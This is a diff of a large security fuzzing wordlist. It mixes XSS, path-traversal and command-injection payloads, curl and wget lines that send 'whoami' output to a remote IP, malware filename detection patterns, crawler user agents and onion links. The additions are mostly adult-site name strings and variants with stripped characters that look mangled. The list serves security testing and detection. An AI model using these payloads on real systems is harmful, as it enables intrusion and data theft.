@@ -2530,6 +2530,7 @@ $~u4\\
 -1.*http://iis.net/robots.txt
 -1<script>a=/crosssitescripting/\ndocument.cookie=true;</script>
 -6\\w!,_ni.2-}dd~11mi!/hv.`obyb
+-> https://docs.hackerone.com/hackers/quality-reports.html
 -\\57
 -\\k6o"&v'ua2'`gd"wbw6vr8m[mqw(
 -\\l
@@ -2945,6 +2946,7 @@ $~u4\\
 .d.^_;%|~\\"=(+us-vp=+pk^bb|mb`
 .envhttp://al.com/robots.txt
 .envhttp://en.wikisource.org/robots.txt
+.html/\
 .jpg$http://rhs.org.uk/robots.txt
 .llms.txthttp://msnbc.msn.com/robots.txt
 .llms.txthttp://sciencealert.com/robots.txt
@@ -5826,6 +5828,7 @@ Origin: https://attacker.com
 \/\/sn1persecurity.com
 \/\/xerosecurity.com
 \/\/yoururl.com
+\/\:type\/
 \000045xpr\000065 ss/*blabl/\\aaaaa!!!*
 \7-\\85
 \[]\\
@@ -6254,6 +6257,7 @@ Origin: https://attacker.com
 \\633633
 \\64\.exe;45
 \\6=
+\\80.152.179
 \\87g9b
 \\89d\.exe;70
 \\92-l5
@@ -6503,6 +6507,8 @@ Origin: https://attacker.com
 \\adpu160\.sys;80
 \\adpu321.sys;60
 \\adsecretsdump\.py;80
+\\adultmovienetwork
+\\adultvideonetwork
 \\advstorshell\.exe;65
 \\afamea1\\index\.jsp
 \\afjuukilf\.exe;50
@@ -6514,7 +6520,10 @@ Origin: https://attacker.com
 \\all users\\application data\\update.msi;80
 \\all users\\application data\\winrar;60
 \\all users\\update.msi;80
+\\allexclusivexxx
 \\alwayspcap\.pl;80
+\\amateurclubhouse
+\\americanbukakke
 \\amserver\\ui\\login\.jsp
 \\amzpa\.exe;50
 \\antak\.aspx;70
@@ -6562,8 +6571,11 @@ Origin: https://attacker.com
 \\asdasd\.sfx\.exe;50
 \\asdasdasdasd\.sfx\.exe;50
 \\asgregrhehr\.exe;50
+\\ask-your-granny
 \\asreproast\.ps1;70
+\\asspoundinghunks
 \\atexec\.exe;90
+\\atlantablackbooty
 \\atmarpd.sys;65
 \\audioendpointbuilder\.exe;60
 \\autoch\.exe;45
@@ -6600,6 +6612,7 @@ Origin: https://attacker.com
 \\backoffice\\servlet\\axis2-web\\index\.jsp
 \\backoffice\\servlet\\index\.jsp
 \\backoffice\\servlet\\login\.jsp
+\\barelylegalsite
 \\batch\.exe;50
 \\bb\\update\.jsp
 \\bcastdvs\.exe;45
@@ -6608,6 +6621,8 @@ Origin: https://attacker.com
 \\bestkatz\.exe;50
 \\bfg]5#f'b^r"az5'cod.mdrfhw{nv
 \\bharath\\index\.jsp
+\\big-black-dicks
+\\bigcocksandloads
 \\bilibili\.dll;50
 \\bind0\.exe;50
 \\bitcoin\.exe;50
@@ -6616,6 +6631,7 @@ Origin: https://attacker.com
 \\bla\.exe;50
 \\bla\.exe;80
 \\blaah\.exe;45
+\\bodaciousblacks
 \\bomb\.exe;50
 \\bonus\.exe;50
 \\bookmarks\.exe;50
@@ -6672,6 +6688,7 @@ Origin: https://attacker.com
 \\cheat\.sfx\.exe;50
 \\cheats\.exe;50
 \\checkers\.dll;50
+\\cheerleaderchicks
 \\chets\.exe;50
 \\chorom\.exe;45
 \\chost\.exe;45
@@ -6711,8 +6728,10 @@ Origin: https://attacker.com
 \\cncdown\.exe$;45
 \\co
 \\coal\.exe;70
+\\cock-lovingmoms
 \\cockz\\index\.jsp
 \\coleman\\index\.jsp
+\\collegefucktour
 \\com\.exe;50
 \\com\\cmd\.jsp
 \\com\\com\.jsp
@@ -6748,6 +6767,7 @@ Origin: https://attacker.com
 \\coockie\.exe;50
 \\copy\.exe;50
 \\cornucopia?
+\\countessaisabella
 \\craaaaaaaaash\.exe;50
 \\crack\.exe;50
 \\crack\.sfx\.exe;50
@@ -6839,8 +6859,10 @@ Origin: https://attacker.com
 \\ddos\.exe;50
 \\de_svr\.exe;50
 \\de_svr\.exe;70
+\\deaneproductions
 \\default user\\application data\\winrar;60
 \\defragsvc\.exe;80
+\\denofiniquityaz
 \\deploy\\wgbmaove\.war\\gerraxwv\.jsp
 \\deploymentmanager\\index\.jsp
 \\desktop\.exe;50
@@ -6919,6 +6941,7 @@ Origin: https://attacker.com
 \\ebbisland;60
 \\ebbnew_linux;60
 \\ebbshave\.;80
+\\ebonygirlsonline
 \\eee\\eee\.jsp
 \\eexplorer\.exe;45
 \\eexxplorer\.exe;45
@@ -6942,6 +6965,7 @@ Origin: https://attacker.com
 \\environcollision;80
 \\envoytomato;80
 \\ep1orer\.exe;45
+\\eroticuniformstour
 \\esc\\esc\\ss\.jsp
 \\esentut\.exe;45
 \\esna\.py$;80
@@ -6963,6 +6987,7 @@ Origin: https://attacker.com
 \\examples\\jsp\\source\.jsp
 \\exe\.exe;50
 \\exeplorer\.exe;45
+\\exhibitionist
 \\exlorer\.exe;45
 \\exoplorer\.exe;45
 \\exp10rer\.exe;45
@@ -7035,6 +7060,7 @@ Origin: https://attacker.com
 \\extremeinjector\.exe;50
 \\exxplorer\.exe;45
 \\exze$;60
+\\eye-candy-girls
 \\ezz\.exe;50
 \\f1ref0x\.exe;45
 \\f32\.dll;50
@@ -7123,6 +7149,7 @@ Origin: https://attacker.com
 \\ghost_sparc;80
 \\ghost_x86;80
 \\gi
+\\global.asa
 \\godmode\.exe;50
 \\google chrome\.exe;50
 \\google-book\.exe;50
@@ -7148,6 +7175,7 @@ Origin: https://attacker.com
 \\hackgpj\.scr;50
 \\hacking\.exe;50
 \\hackkk\.sfx\.exe;50
+\\hardcoresexshack
 \\haslo\.dat;80
 \\haslo\.exe;80
 \\hawkeye_keylogger_;70
@@ -7163,8 +7191,10 @@ Origin: https://attacker.com
 \\hidserv\.exe;55
 \\hitman\.exe;50
 \\holgerdogz\.exe;50
+\\hollywoodxposed
 \\hookdc64\.dll;80
 \\hookdc\.dll;80
+\\hornyblondegirls
 \\hosts\.exe;50
 \\hostsys\.exe;50
 \\hpnd5x86.sys;60
@@ -7386,6 +7416,7 @@ Origin: https://attacker.com
 \\kaka\.exe;50
 \\kakou\\kakou\.jsp
 \\kaosx\.exe;50
+\\katesplayground
 \\katzen\.exe;50
 \\kernelpop\.py;80
 \\keygen1\.exe;65
@@ -7579,6 +7610,7 @@ Origin: https://attacker.com
 \\mobile\.exe;50
 \\mom64\.exe;60
 \\momo\\no\.jsp
+\\monstercockfarm
 \\movie\.exe;60
 \\movie\.exe;65
 \\mozilla\.exe;80
@@ -9309,6 +9341,7 @@ Origin: https://attacker.com
 \\namecard\\namecard\.jsp
 \\namlah\\namlah\.jsp
 \\nana\.exe;50
+\\naughtysquirter
 \\nbt\.exe;90
 \\nbtscan\.exe;60
 \\ndisalex\.sys;60
@@ -9399,6 +9432,7 @@ Origin: https://attacker.com
 \\pdf\.exe;65
 \\pe
 \\perfect\.exe;50
+\\perfectlesbians
 \\photo1\.exe;50
 \\photo\.exe;65
 \\pic\.jpg\.exe;50
@@ -11168,6 +11202,7 @@ Origin: https://attacker.com
 \\rat\.exe;50
 \\rata\.exe;50
 \\ratnik\.exe;50
+\\ravenhillstudios
 \\rcpping\.exe;45
 \\rct\.exe;80
 \\rdchost\.exe;45
@@ -11274,6 +11309,7 @@ Origin: https://attacker.com
 \\secret\.exe;50
 \\secretsdump\.exe;90
 \\secure\.exe;50
+\\sensualsubmission
 \\serhost\.exe;45
 \\servar\\servar\.jsp
 \\servehost\.exe;45
@@ -11298,6 +11334,7 @@ Origin: https://attacker.com
 \\shellinvoker\\index\.jsp
 \\shellinvoker\\shellinvoker\.jsp
 \\shellinvokxy\\shellinvokxy\.jsp
+\\shemalesurprises
 \\shhost\.exe;45
 \\shorcutlauncher\.exe;80
 \\shortcutfixer\.exe;60
@@ -11325,6 +11362,7 @@ Origin: https://attacker.com
 \\smbscan;60
 \\smgodyfatv\\smgodyfatv\.jsp
 \\smjwcyadot\\smjwcyadot\.jsp
+\\smokingmaryjane
 \\smrnqgdfbx\\smrnqgdfbx\.jsp
 \\smsniff\.exe;50
 \\smsvchost\.exe;45
@@ -11346,6 +11384,7 @@ Origin: https://attacker.com
 \\sonyxmlchartfeed\\sonyxmlchartfeed\.jsp
 \\soohost\.exe;45
 \\sources\.exe;50
+\\southern-charms
 \\spchost\.exe;45
 \\spqr\\
 \\spring\.exe;50
@@ -11642,6 +11681,8 @@ Origin: https://attacker.com
 \\taskse\.exe;75
 \\tcpdump32c\.exe;45
 \\tcping\.exe;60
+\\teenagebeauties
+\\teenagefantasies
 \\temp\.exe;50
 \\temp\\ayrunsc\.exe;80
 \\temp\\copy\.exe;45
@@ -11667,6 +11708,8 @@ Origin: https://attacker.com
 \\tf394kv\.dll;75
 \\th
 \\th$4v)baq$ou<
+\\ticklemeinnylons
+\\tiedupfantasies
 \\tiersvc\.exe;80
 \\tiger2\\index\.jsp
 \\tlntsvr32\.exe;50
@@ -11676,6 +11719,7 @@ Origin: https://attacker.com
 \\tmpinit\.exe;45
 \\tmui\\login\.jsp
 \\toffeehammer;80
+\\tonyscastingcouch
 \\tool\.exe;50
 \\tosufd\.exe;50
 \\triedit.sys;80
@@ -11707,6 +11751,7 @@ Origin: https://attacker.com
 \\uvchost\.exe;45
 \\v3
 \\validadordocumento\\validadordocumento\.jsp
+\\vampyre-erotica
 \\vasyakatz\.exe;50
 \\vba32ar\.cab\.dat;90
 \\vba32ar\.exe;80
@@ -12049,6 +12094,8 @@ Origin: https://attacker.com
 \\zxcvbnm,./
 \\zz11
 \\zzmeu\\zzmeu\.jsp
+\\{\value.link\}
+\\{profilepicture\}
 \n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
 \n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
 \n\r\t\"\\
@@ -12136,6 +12183,7 @@ aaaa/9.80 (windows nt 6.1; wow64; u; tr) presto/2.10.229 version/11.64 appengine
 ab2/\@adminaddadmin?uid=foo&password=bar&re_password=bar
 ab2/\@adminviewerror
 ab2/help_c/\@ab2helpsearch?scope=help&dwebquery=<script>alert(vulnerable)</script>
+ab2/help_c/\@ab2helpsearch?scope=help&dwebquery=a
 ab\\
 ab\\1
 ab\\4
@@ -12176,6 +12224,7 @@ adaxas spider (http://www.adaxas.net/)
 adcb245lqe/\
 add <!--#exec cmd="/bin/echo '<scr'"--><!--#exec cmd="/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'"-->
 add topic <iframe src=http://www.vulnerability-lab.com>
+adfs/ls?wa=wsignin1.0&wtrealm=http://www.cirt.net
 admantx-adform/2.4 (+http://www.admantx.com/service-fetcher.html)
 admantx-adform/2.5 (+http://www.admantx.com/service-fetcher.html)
 admantx-adform/3.0 (+http://www.admantx.com/service-fetcher.html)
@@ -12195,6 +12244,7 @@ admantx-ussy02/2.5 (+http://www.admantx.com/service-fetcher.html)
 admantx-ussy02/3.0 (+http://www.admantx.com/service-fetcher.html)
 admin*http://hunker.com/robots.txt
 admin*http://techeblog.com/robots.txt
+admin/\
 admin@1234567/\
 admin\\3
 ads.txthttp://dzone.com/robots.txt
@@ -12240,6 +12290,7 @@ alexander r. mason https://www.linkedin.com/in/alexanderrmason
 alg websites - website screenshot tool (https://www.webscreenshot.co.uk)
 ali abdelkader https://www.facebook.com/tunisian.leader
 alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,
+alibaba.pl|dir20..\\..\\..\\..\\..\\..\\..\\
 all the latest news for tor: http://newsiiwanaduqpre.onion/
 allany16\\
 allinurl:http://www.google.co.in/latitude/apps/badge/api?user=
@@ -12657,6 +12708,7 @@ aspire\\\"m2
 aspx/read.aspxhttp://hunker.com/robots.txt
 aspx/read.aspxhttp://ponycanyon.co.jp/robots.txt
 assassination service: http://cthulhuuap7ch47k.onion
+assets/\
 assets/pdf/investigation-report.pdfhttp://ruby-lang.org/robots.txt
 assets/pdf/investigation-report.pdfhttp://startrek.com/robots.txt
 asst. prof. / rbse director of r & d     web: http://ricis.cl.uh.edu/eichmann/
@@ -12669,6 +12721,7 @@ attachments/http://csmonitor.com/robots.txt
 audio-edition-podcast/*/index.xmlhttp://economictimes.indiatimes.com/robots.txt
 aus1.torproject.org: http://x3nelbld33llasqv.onion/
 aus2.torproject.org: http://vijs2fmpd72nbqok.onion/
+auth/auth_phpbb/phpbb_root_path=https://example.com
 author url: http://sirdarckcat.net/
 autistici/inventati: http://wi7qkxyrdpu5cmvr.onion/
 automated security by donn parker: http://www.infosecurity.com/
@@ -12927,6 +12980,7 @@ blogwatcher_spider/0.1 (http://www.lr.pi.titech.ac.jp/blogwatcher/)
 blogzice/1.0 (+http://icerocket.com; rhodes@icerocket.com)
 blogzice/1.0 +http://www.icerocket.com/
 bloodhound/nutch-0.9 (testing crawler for research - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)
+blueup\\
 bm[-wx'kzidheex0ot\\[f"i;^plquk
 bmdhh1\\2
 bmdhh1\\3
@@ -13277,19 +13331,25 @@ cfa\\69
 cfa\\72
 cfdev03\\4
 cfdocs/exampleapp/email/getfile.cfm?filename=c:\\boot.ini
+cfdocs/exampleapp/email/getfile.cfm?filename=c\\boot.ini
 cfide/debug/cf_debugfr.cfm?userpage=http%3a%2f%2fgoogle.com
 cgi-bin/..\\..\\..\\..\\..\\..\\winnt\system32\cmd.exe?/c+dir+c:\\
 cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,
+cgi-bin/alibaba.pl|dir20..\\..\\..\\..\\..\\..\\..\\
 cgi-bin/formhandler.cgi?realname=aaa&email=aaa&reply_message_template=%2fetc%2fpasswd&reply_message_from=sq%40example.com&redirect=http%3a%2f%2fwww.example.com&recipient=sq%40example.com
 cgi-bin/input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
+cgi-bin/input.bat?|dir20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 cgi-bin/input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
+cgi-bin/input2.bat?|dir20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 cgi-bin/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
 cgi-bin/notices/http://cbre.com/robots.txt
 cgi-bin/redir.exe?url=http%3a%2f%2fwww%2egoogle%2ecom%2f%0d%0a%0d%0a%3cscript%3ealert%28%27vulnerable%27%29%3c%2fscript%3e
 cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
 cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
 cgi-bin/test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
+cgi-bin/test.bat?|dir20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,
+cgi-bin/tst.bat|dir20..\\..\\..\\..\\..\\..\\..\\..\\
 cgi-binhttp://baidu.com/robots.txt
 cgi-binhttp://ifttt.com/robots.txt
 cgi-binhttp://similarweb.com/robots.txt
@@ -14251,6 +14311,9 @@ filangy/1.0x (filangy; http://www.nutch.org/docs/en/bot.html; filangy-agent@fila
 file://\/\/etc/passwd
 file_%2f%2f%2froot%2fdesktop.xml
 fileboost.net/1.0 (+http://www.fileboost.net)
+files/90x60/\
+files/90x60/\\{value.foto\}
+files/logos/\\{development.logo\}
 filetype:swf inurl:xml site:http://target.com
 filetype:url +inurl:\"ftp://\" +inurl:\";@\"
 filing/free-file-fillable-forms/free-file-fillable-forms-support-2http://iana.org/robots.txt
@@ -14332,6 +14395,7 @@ fs\\7
 fs\\9
 fscom\\\"pig2poo\\\"
 ftb-bot http://www.findthebest.co.uk/
+fucking\\\\
 fuckme11\\
 fvy9y3b3idvonjlk3)sy<4/\f=q3(t
 fws\\14
@@ -16240,6 +16304,7 @@ infowizards reciprocal link system pro - (http://www.infowizards.com)
 ingrid/3.0 mt (webcrawler@nospamexperimental.net; http://webmaster.ilse.nl/jsp/webmaster.jsp)
 innerprisebot/1.0 (http://www.innerprise.com/)
 innovationshttp://beta.character.ai/robots.txt
+inotes/forms5.nsf/\$defaultnav
 input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 input.bat?|dir20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
@@ -16536,6 +16601,7 @@ lems\\3lems
 lems\\4
 lems\\7lems
 lems\\lems
+leonjass\\\\
 lerc\\5
 letscrawl.com/1.0 +http://letscrawl.com/
 letsencrypt/index?filename=c:\\windows\\win.ini
@@ -16648,6 +16714,7 @@ lucky eddie'92s home: http://4fvfamdpoulu2nms.onion/
 luuka400\\
 lvd@oatqr0s6idba^,5u6*\\kf^wg[}
 lynx/2.8 (;http://seebot.org)
+l{{{{{{r\\\\
 m!lw[v+jr[w<`]^@)1msy&*\\qh#ke|
 m#{f)b637/splgv~kx=l1k$%bc~/\\q
 m(3fuzdeo#es,`hsill;zgj<=\\s!qo
@@ -19257,6 +19324,7 @@ munin*http://melon.com/robots.txt
 munin*http://quintetoinvento.com/robots.txt
 munin.torproject.org: http://hhr6fex2giwmolct.onion/
 munna\\\'s
+mus\\\abdabright
 music downloads: http://wuvdsbmbwyjzsgei.onion/
 musicwalker2.0 ( http://www.somusical.com)
 mv\\600
@@ -19781,6 +19849,7 @@ pell\l\\4
 pell\l\\5
 pell\l\\6
 pell\l\\8
+peoplejustain\\\'tnogood
 peoples drug store: http://newpdsuslmzqazvr.onion
 perl -e 'print \"&lt;img src=java\0script&#058;alert(\\"xss\\")&gt;\";' &gt; out
 perl -e 'print \"&lt;scr\0ipt&gt;alert(\\"xss\\")&lt;/scr\0ipt&gt;\";' &gt; out
@@ -19791,6 +19860,7 @@ peru1980\\
 peter - http://pgl.yoyo.org/as/
 peun\\9
 php-textile: https://github.com/textile/php-textile
+phpbb2/search.php?search_id=1\\
 physics1\\'
 physics\\0
 physics\\1
@@ -19903,6 +19973,7 @@ python-urllib/1.17 appengine-google; (+http://code.google.com/appengine; appid: 
 python-urllib/2.5 appengine-google; (+http://code.google.com/appengine; appid: s~html2canvas)
 python-urllib/2.6 (http://juls.savba.sk)
 python-urllib/2.7 appengine-google; (+http://code.google.com/appengine)
+p{{{{{{r\\\\
 q.nf9l\u000b8glt\\m:kxyd$#f*m#3`gj*uz
 q.p?l-8xowcaly16'|jgp&"/\\i(`wp
 q.qawuf]]w))ml@aw4yzba[_\\0cu=a
@@ -19967,6 +20038,7 @@ rd\\632
 rd\\8
 rds/imagedb/results?http://worldtimebuddy.com/robots.txt
 rdxsun\\8
+read/attach_file.tml?page=http://cirt.net
 reap-crawler nutch/nutch-1.0-dev (reap project; http://reap.cs.cmu.edu/reap-crawler/; reap project)
 reaper [2.03.10-031204] (http://www.sitesearch.ca/reaper/)
 reaper/2.0x (+http://www.sitesearch.ca/reaper)
@@ -19983,6 +20055,7 @@ red\\0
 red\\1
 red\\2
 red\\6
+red\\\'spider3
 redcarpet/1.2 (http://www.redcarpet-inc.com/robots.html)
 redcell/0.1 (infosec search bot (coming soon); http://www.telegenetic.net/bot.html; lhall@telegenetic.net)
 redir.exe?url=http%3a%2f%2fwww%2egoogle%2ecom%2f%0d%0a%0d%0a%3c
@@ -20042,6 +20115,7 @@ rider777\\
 rivm\\9
 rixbot (http://babelserver.org/rix)
 rizostronza/1.0 (compatible; googlebot/2.1; +http://www.google.com/bot.html)
+rj10ithvie/\\na
 rli_}dl!/bba}@q87d&*8="ki$g\\=$
 rlsf8j*zr_$h\{g>kz@'w\\sd5^`fof)
 rm\\05serfe-a
@@ -20594,6 +20668,7 @@ rwasic\\7
 ryan satterfield https://planetzuda.com
 ryan waldron   |||   http://www.traveller.com/~rew   |||   rew@traveller.com
 rywja%f9dhg_t"/rmv?p2_)4aw5zd\\
+r{{{{{{r\\\\
 s&amp;l spider (http://search.hirners.com/)
 s&xgz+;mvh-0p;gum\\h]\{t1v|;x;k&
 s*,d`lc\\xah^1u_d<ba$mvhuvtppar
@@ -20686,6 +20761,7 @@ sal-sun\\9
 salt: http://salted7fpnlaguiq.onion/
 sam eizad - https://www.linkedin.com/in/sameizad
 samiloveyou\\'
+sample/xls2mysql/parser_path=https://example.com?
 samsung http://innovator samsungmobile.com
 samsung store: http://storegsq3o5mfxiz.onion/
 samsung-gt-s3650/s365mxxjb1 shp/vpp/r5 jasmine/1.0 nextreaming smm-mms/1.2.0 profile/midp-2.1 configuration/cldc-1.1 read more at http://www.mobilerated.com/samsung-gt-s3650-corby-specifications.html#k67wwfyicwkwwct3.99
@@ -22921,6 +22997,7 @@ truwogps/1.0 (gnu/linux; u; i686; en-us; +http://www.lan4lano.net/browser.html )
 try*http://what3words.com/robots.txt
 tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,
 tst.bat|dir20..\\..\\..\\..\\..\\..\\..\\..\\
+tucker\\\'s
 tulipchain/5.x (http://ostermiller.org/tulipchain/) java/1.x.1_0x (http://java.sun.com/) linux/2.4.17
 tulipchain/5.xx (http://ostermiller.org/tulipchain/) java/1.x.1_0x (http://apple.com/) mac_os_x/10.2.8
 tumblr/1.0 rss syndication (+http://www.tumblr.com/) (support@tumblr.com)
@@ -23157,6 +23234,7 @@ vsxqw\\@rc^lkikg@u)7]s)?z4xu@r(
 vwbot/nutch-0.9-dev (vwbot nutch crawler; http://vwbot.cs.uiuc.edu;+vwbot@cs.uiuc.edu
 vz*>jbqmey;mm<z_cpj)@*/k\\&80<`
 vzasolajv#u8btyc,q}ql$p23\\@*<x
+v{{{{{{p\\\\
 v|^y}m\\\\zivmm*vijqmyksh^l2y`pv
 w$\\
 w/index.phphttp://hackbrightacademy.com/robots.txt
@@ -23251,6 +23329,7 @@ win\\
 win\\1
 win\\9
 windmail.exe?%20-n%20c:\boot.ini%20hacker@hax0r.com%20|%20dir%20c:\\
+windmail.exe?20-n20c\boot.ini20hacker@hax0r.com20|20dir20c\\
 window.location.assign("http://xss.cx")
 window.open("http://xss.cx","confirm(document.domain);", "", false);
 windows 7 appengine-google; (+http://code.google.com/appengine; appid: s~greatfirewallescape)
@@ -23471,6 +23550,7 @@ wwweasel robot v1.00 (http://wwweasel.de)
 wwwwww/http://grindr.com/robots.txt
 wwwwww/http://mytuner-radio.com/robots.txt
 wzj?p&\\4rgp#-"m^tey/ifv2cgrvl_
+w{{{{{{r\\\\
 w}?ki!]h6r}-]v)\\ejiy/d^ur>ve[j
 x$p}g^v3$61q~oi\\c.oz|-,7)bj\\6p
 x'rava\\<xzv&t%9>gne<5],1'yp!~6
@@ -23531,6 +23611,7 @@ xvj_kdf03v1>\\;1^u?@e}?iz]nf{fc
 xxx<style>*{color:gre/**/en !/**/important} /* ie 6-9 standards mode */<!----><!--*{color:red}   /* all ua */*{background:url(xx:x //**/\red/*)} /* ie 6-7 standards mode */</style>
 xxx<style>*{color:gre/**/en !/**/important}*{color:red}*{background:url(xx:x //**/\red/*)}</style>
 xz?_fd-be\\#:k/+fb[b7dq'gphww^fu!7hk$g7+7ex$ewk_n-r
+x{{{{{{p\\\\
 y!j-asr/0.1 crawler (http://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)
 y!j-asr/1.0 crawler (http://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)
 y!j-brj/yats crawler (http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)
